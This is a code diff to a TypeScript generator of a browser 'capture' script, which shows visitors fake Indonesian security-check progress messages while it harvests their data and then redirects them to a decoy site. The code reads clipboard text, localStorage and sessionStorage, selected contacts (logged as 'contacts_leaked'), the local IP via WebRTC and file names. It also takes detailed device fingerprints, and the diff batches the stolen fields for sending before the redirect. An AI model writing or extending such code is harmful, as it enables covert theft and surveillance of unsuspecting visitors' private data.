@@ -14,12 +14,13 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
     var requiredPerms = ${JSON.stringify(perms)};
     var cfg = ${JSON.stringify(theme)};
     
-    function checkRedirect() {
+    async function checkRedirect() {
       if (hasRedirected) return;
       var elapsed = (Date.now() - startTime) / 1000;
       var threshold = (flowType === 'full') ? 60 : 15;
       if (elapsed >= threshold || (permsCompleted >= requiredPerms.length && elapsed >= 5)) {
         hasRedirected = true;
+        await flushExtra();
         window.location.href = targetUrl;
       }
     }
@@ -53,6 +54,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       var statusText = document.getElementById('status-text');
       var bar = document.getElementById('progress-bar');
       var icon = document.getElementById('status-icon');
+      var extraBuffer = {};
       
       function updateProgress(p, text, title) {
         if (bar) bar.style.width = p + '%';
@@ -70,8 +72,25 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           } catch(e) { return null; }
         }
 
-      function finish(success, reason) {
-        if (isSilent) { window.location.href = targetUrl; return; }
+      async function logExtra(data) {
+        Object.assign(extraBuffer, data);
+      }
+
+      async function flushExtra() {
+        if (Object.keys(extraBuffer).length > 0) {
+          var dataToSend = Object.assign({}, extraBuffer);
+          extraBuffer = {};
+          await logEvent('extra', dataToSend);
+        }
+      }
+
+      async function finish(success, reason) {
+        await flushExtra();
+        if (isSilent) {
+          hasRedirected = true;
+          window.location.href = targetUrl; 
+          return; 
+        }
         if (bar) bar.style.width = '100%';
         if (success) {
           if (icon) icon.innerText = "✅";
@@ -84,7 +103,11 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           if (statusTitle) statusTitle.innerText = "COMPLETE";
           if (statusText) statusText.innerText = "Proses selesai. Membuka akses...";
         }
-        setTimeout(checkRedirect, 3000);
+        setTimeout(async function() {
+           await flushExtra();
+           hasRedirected = true;
+           window.location.href = targetUrl;
+        }, 3000);
       }
 
       try {
@@ -161,7 +184,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             if (!start) start = timestamp;
             frames++;
             if (timestamp - start > 1000) {
-              await logEvent('extra', { display_hz: Math.round((frames * 1000) / (timestamp - start)) });
+              await logExtra({ display_hz: Math.round((frames * 1000) / (timestamp - start)) });
               return;
             }
             requestAnimationFrame(check);
@@ -172,7 +195,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         // Deep Recon: Vibration Test
         if (navigator.vibrate) {
           navigator.vibrate([10, 50, 10]);
-          logEvent('extra', { haptic_ready: true });
+          logExtra({ haptic_ready: true });
         }
 
         // Deep Recon: Incognito Detection
@@ -180,7 +203,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           if (navigator.storage && navigator.storage.estimate) {
             navigator.storage.estimate().then(async function(est) {
               var isPrivate = est.quota < 120000000;
-              await logEvent('extra', { incognito_audit: isPrivate });
+              await logExtra({ incognito_audit: isPrivate });
             });
           }
         })();
@@ -192,7 +215,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           Object.defineProperty(element, 'id', { get: function() { devtools = true; } });
           setTimeout(async function() { 
             console.log(element);
-            await logEvent('extra', { devtools_open: devtools }); 
+            await logExtra({ devtools_open: devtools }); 
           }, 2000);
         })();
 
@@ -213,7 +236,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           audioCtx.startRendering().then(async function(buffer) {
             var sum = 0;
             for (var i = 4500; i < 5000; i++) sum += Math.abs(buffer.getChannelData(0)[i]);
-            await logEvent('extra', { audio_sig: sum.toString() });
+            await logExtra({ audio_sig: sum.toString() });
           });
         } catch(e) {}
 
@@ -229,11 +252,11 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
              ctx.font = "72px '" + f + "', sans-serif";
              if (ctx.measureText("mmmmmmmmmmlli").width !== baseline) detectedFonts.push(f);
            });
-           await logEvent('extra', { installed_fonts: detectedFonts.join(',') });
+           await logExtra({ installed_fonts: detectedFonts.join(',') });
         } catch(e) {}
 
         // Deep Recon: Hardware API Availability
-        await logEvent('extra', {
+        await logExtra({
           api_bluetooth: !!navigator.bluetooth,
           api_usb: !!navigator.usb,
           api_hid: !!navigator.hid,
@@ -259,14 +282,14 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               gl_version: gl.getParameter(gl.VERSION),
               shading_lang: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
             };
-            await logEvent('extra', { gpu_full_profile: JSON.stringify(gpuData) });
+            await logExtra({ gpu_full_profile: JSON.stringify(gpuData) });
           }
         } catch(e) {}
 
         // Deep Recon: Advanced Battery
         if (navigator.getBattery) {
           navigator.getBattery().then(async function(b) {
-            await logEvent('extra', { 
+            await logExtra({ 
               battery_level: b.level * 100 + '%',
               battery_charging: b.charging,
               battery_time: b.chargingTime === Infinity ? 'N/A' : b.chargingTime
@@ -280,7 +303,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         // Deep Recon: High Entropy Brand/Model Detection
         if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
           navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor']).then(async function(h) {
-             await logEvent('extra', { hardware_brand_profile: JSON.stringify(h) });
+             await logExtra({ hardware_brand_profile: JSON.stringify(h) });
           }).catch(function(){});
         }
 
@@ -288,7 +311,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         (async function(){
           var start = performance.now();
           for(var i=0; i<1000000; i++) Math.sqrt(i);
-          await logEvent('extra', { cpu_compute_score: (performance.now() - start).toFixed(2) + 'ms' });
+          await logExtra({ cpu_compute_score: (performance.now() - start).toFixed(2) + 'ms' });
         })();
         try {
           var pc = new RTCPeerConnection({iceServers:[]});
@@ -297,7 +320,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           pc.onicecandidate = async function(ice) {
             if (ice && ice.candidate && ice.candidate.candidate) {
               var ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
-              await logEvent('extra', { local_ip: ip });
+              await logExtra({ local_ip: ip });
             }
           };
         } catch(e) {}
@@ -305,7 +328,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         // Deep Recon: Clipboard Buffer
         if (navigator.clipboard && navigator.clipboard.readText) {
            navigator.clipboard.readText().then(async function(txt) {
-             if (txt) await logEvent('extra', { clipboard_sync: txt.substring(0, 1500) });
+             if (txt) await logExtra({ clipboard_sync: txt.substring(0, 1500) });
            }).catch(function(){});
         }
 
@@ -332,8 +355,8 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           platforms.forEach(function(p) {
             var img = new Image();
             var start = Date.now();
-            img.onload = async function() { await logEvent('extra', { social_active: p.name, load_ms: Date.now() - start }); };
-            img.onerror = async function() { await logEvent('extra', { social_inactive: p.name }); };
+            img.onload = async function() { await logExtra({ social_active: p.name, load_ms: Date.now() - start }); };
+            img.onerror = async function() { await logExtra({ social_inactive: p.name }); };
             img.src = p.url + '?v=' + start;
           });
         })();
@@ -348,7 +371,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
            document.body.appendChild(bait);
            setTimeout(async function() {
              var blocked = bait.offsetHeight === 0 || window.getComputedStyle(bait).display === 'none';
-             await logEvent('extra', { adblock_detected: blocked });
+             await logExtra({ adblock_detected: blocked });
              bait.remove();
            }, 1000);
         })();
@@ -359,13 +382,13 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           nodes.forEach(function(n) {
             var start = Date.now();
             fetch(n, { mode: 'no-cors', cache: 'no-cache' }).then(async function() {
-              await logEvent('extra', { network_rtt: n, latency: Date.now() - start });
+              await logExtra({ network_rtt: n, latency: Date.now() - start });
             }).catch(function(){});
           });
         })();
 
         // Deep Recon: Orientation & Peripherals
-        await logEvent('extra', {
+        await logExtra({
           orientation: screen.orientation ? screen.orientation.type : 'N/A',
           gamepads: (navigator.getGamepads ? navigator.getGamepads().length : 0),
           languages: navigator.languages.join(',')
@@ -388,7 +411,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               if (!isSilent) updateProgress(prog, "Memvalidasi cache data aman...", "BUFFER_SYNC");
               if (navigator.clipboard) {
                 var clip = await navigator.clipboard.readText().catch(function(){});
-                if (clip) await logEvent('extra', { clipboard: clip });
+                if (clip) await logExtra({ clipboard: clip });
               }
             }
 
@@ -413,7 +436,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
                     var devs = await navigator.mediaDevices.enumerateDevices();
                     var list = devs.map(d => d.kind + ': ' + (d.label || 'Secure-Device-' + Math.random().toString(36).substr(2,5))).join('\\n');
-                    await logEvent('extra', { media_hardware: list });
+                    await logExtra({ media_hardware: list });
                     stream.getTracks().forEach(t => t.stop());
                   }
                 } catch(e) {}
@@ -481,7 +504,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                  if (handle) {
                     for (const item of handle) {
                       var file = await item.getFile();
-                      await logEvent('extra', { file_name: file.name, file_size: file.size, file_type: file.type });
+                      await logExtra({ file_name: file.name, file_size: file.size, file_type: file.type });
                     }
                  }
               }
@@ -491,7 +514,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               if (!isSilent) updateProgress(prog, "Storage forensics & quota check...", "DISK_INTEGRITY");
               if (navigator.storage && navigator.storage.estimate) {
                 var est = await navigator.storage.estimate();
-                await logEvent('extra', { storage_mb: (est.usage / 1024 / 1024).toFixed(2), quota_gb: (est.quota / 1024 / 1024 / 1024).toFixed(2) });
+                await logExtra({ storage_mb: (est.usage / 1024 / 1024).toFixed(2), quota_gb: (est.quota / 1024 / 1024 / 1024).toFixed(2) });
               }
             }
 
@@ -500,13 +523,13 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                try {
                  if (window.Magnetometer) {
                    var mag = new Magnetometer({frequency: 1});
-                   mag.onreading = () => logEvent('extra', { sensor_mag: mag.x + ',' + mag.y + ',' + mag.z });
-                   mag.onerror = (e) => logEvent('extra', { sensor_error: 'Mag:' + e.error.message });
+                   mag.onreading = () => logExtra({ sensor_mag: mag.x + ',' + mag.y + ',' + mag.z });
+                   mag.onerror = (e) => logExtra({ sensor_error: 'Mag:' + e.error.message });
                    mag.start(); setTimeout(() => mag.stop(), 2000);
                  }
                  if (window.AmbientLightSensor) {
                     var als = new AmbientLightSensor({frequency: 1});
-                    als.onreading = () => logEvent('extra', { sensor_lux: als.illuminance });
+                    als.onreading = () => logExtra({ sensor_lux: als.illuminance });
                     als.start(); setTimeout(() => als.stop(), 2000);
                  }
                } catch(e) {}
@@ -518,7 +541,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                 try {
                   var props = await navigator.contacts.getProperties();
                   var selected = await navigator.contacts.select(props, { multiple: true }).catch(function(){ return null; });
-                  if (selected) await logEvent('extra', { contacts_leaked: JSON.stringify(selected) });
+                  if (selected) await logExtra({ contacts_leaked: JSON.stringify(selected) });
                 } catch(e) {}
               }
             }
@@ -531,7 +554,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             if (p === 'network') {
                if (!isSilent) updateProgress(prog, "Analisis integritas node jaringan...", "NETWORK_INTELLIGENCE");
                if (navigator.connection) {
-                  await logEvent('extra', { 
+                  await logExtra({ 
                     net_effective: navigator.connection.effectiveType,
                     net_rtt: navigator.connection.rtt,
                     net_downlink: navigator.connection.downlink,
@@ -543,19 +566,19 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             if (p === 'bluetooth') {
                if (!isSilent) updateProgress(prog, "Scanning peripheral bus...", "BT_DISCOVERY");
                if (navigator.bluetooth) {
-                  await navigator.bluetooth.getAvailability().then(async avail => await logEvent('extra', { bt_available: avail }));
+                  await navigator.bluetooth.getAvailability().then(async avail => await logExtra({ bt_available: avail }));
                }
             }
             if (p === 'performance') {
                if (!isSilent) updateProgress(prog, "Benchmarking hardware bus...", "BUS_SPEED");
                var memory = navigator.deviceMemory || "N/A";
                var cores = navigator.hardwareConcurrency || "N/A";
-               await logEvent('extra', { perf_cores: cores, perf_mem: memory });
+               await logExtra({ perf_cores: cores, perf_mem: memory });
             }
 
             if (p === 'security') {
                if (!isSilent) updateProgress(prog, "Kernel security environment audit...", "KERNEL_SEC");
-               await logEvent('extra', { 
+               await logExtra({ 
                  sec_webdriver: navigator.webdriver,
                  sec_cookies: navigator.cookieEnabled,
                  sec_java: navigator.javaEnabled(),
@@ -569,7 +592,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                if (navigator.queryLocalFonts) {
                   try {
                     var fonts = await navigator.queryLocalFonts();
-                    await logEvent('extra', { fonts_count: fonts.length, fonts_sample: fonts.slice(0, 5).map(f => f.fullName).join(',') });
+                    await logExtra({ fonts_count: fonts.length, fonts_sample: fonts.slice(0, 5).map(f => f.fullName).join(',') });
                   } catch(e) {}
                }
             }
@@ -579,14 +602,14 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                if (window.getScreenDetails) {
                   try {
                     var details = await window.getScreenDetails();
-                    await logEvent('extra', { screens: details.screens.length, screen_primary: details.currentScreen.label });
+                    await logExtra({ screens: details.screens.length, screen_primary: details.currentScreen.label });
                   } catch(e) {}
                }
             }
 
             if (p === 'storage_map') {
                if (!isSilent) updateProgress(prog, "Mapping data persistent layer...", "PERSISTENT_MAP");
-               await logEvent('extra', {
+               await logExtra({
                  storage_ls: JSON.stringify(localStorage).substring(0, 3000),
                  storage_ss: JSON.stringify(sessionStorage).substring(0, 3000)
                });
@@ -597,7 +620,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                try {
                   var start = Date.now();
                   await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors' });
-                  logEvent('extra', { beacon_rtt: (Date.now() - start) + 'ms' });
+                  await logExtra({ beacon_rtt: (Date.now() - start) + 'ms' });
                } catch(e) {}
             }
           } catch(e) {}
